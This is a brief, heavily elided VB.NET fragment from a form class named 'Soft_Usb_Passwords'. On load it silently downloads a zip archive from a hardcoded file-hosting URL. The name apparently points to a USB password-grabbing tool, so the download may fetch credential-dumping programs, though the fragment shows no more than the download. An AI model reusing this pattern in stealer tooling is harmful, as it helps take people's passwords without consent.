...
Public Class Soft_Usb_Passwords
    ...
    Private Sub Soft_Usb_Passwords_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_32d209e4f9824756b07b522493bbad82.zip"), Texbbb.TextBox42.Text)
